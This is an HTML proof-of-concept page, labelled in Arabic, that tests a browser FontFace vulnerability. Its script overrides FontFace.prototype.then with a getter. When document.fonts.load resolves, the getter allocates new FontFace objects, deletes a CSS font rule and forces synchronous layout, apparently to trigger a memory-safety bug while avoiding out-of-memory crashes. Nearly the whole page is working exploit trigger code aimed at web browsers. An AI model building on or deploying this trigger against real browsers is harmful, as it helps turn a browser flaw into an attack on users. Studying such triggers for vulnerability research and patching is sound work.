<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>فحص الثغرة الأصلية - منع OOM</title>
    <style>
        body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 350px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
        .log { margin-bottom: 8px; }
        .warn { color: #ffaa00; }
        .error { color: #ff3333; }
        button { background-color: #00ffcc; color: #000; padding: 10px 20px; font-weight: bold; border: none; cursor: pointer; }
    </style>
</head>
<body>

    <h2>فحص استقرار ثغرة FontFace الأصلية</h2>
    <button onclick="runPoc()">تشغيل الفحص المستقر</button>
    
    <div id="custom-console">[نظام المحاكاة نشط]: جاهز لتتبع المكدس...</div>

    <script>
        // نظام العرض على الشاشة
        const consoleElement = document.getElementById('custom-console');
        function screenLog(msg, isWarn = false) {
            const entry = document.createElement('div');
            entry.className = isWarn ? 'log warn' : 'log';
            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            consoleElement.appendChild(entry);
            consoleElement.scrollTop = consoleElement.scrollHeight;
        }

        function runPoc() {
            screenLog("بدء تشغيل الثغرة...");
            
            // 1. إعداد البيئة وقاعدة الخط x
            const style = document.createElement('style');
            style.id = "s";
            document.head.appendChild(style);
            style.sheet.insertRule("@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }", 0);

            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            void A.loaded;

            let fired = false;

            // 2. كمين التداخل المنطقي مع منع الـ OOM
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        screenLog("!! تم رصد التداخل بنجاح !!", true);
                        
                        // حجز كائنات جديدة لمحاولة ملء مساحة الذاكرة
                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                        
                        // الحذف وإجبار التنسيق المتزامن
                        try {
                            document.getElementById('s').sheet.deleteRule(0);
                            screenLog("تم حذف القاعدة بنجاح.");
                        } catch(e) { screenLog("فشل الحذف: " + e.message, true); }
                        
                        let offset = document.body.offsetTop;
                        screenLog("قيمة الـ Offset المسترجعة: " + offset);
                    }
                    
                    // الحل الهندسي: إرجاع دالة تقوم بعمل resolve بدلاً من undefined لمنع الـ OOM
                    return function(resolve) { 
                        if (resolve) resolve(); 
                    };
                }
            });

            // 3. إطلاق دالة الـ load الرسمية لتفعيل الـ Layout Pipeline
            screenLog("إطلاق دالة document.fonts.load...");
            document.fonts.load('1em x', 'AB');
        }

        window.onerror = function(msg) {
            screenLog("خطأ في النظام: " + msg, true);
            return true;
        };
    </script>
</body>
</html>
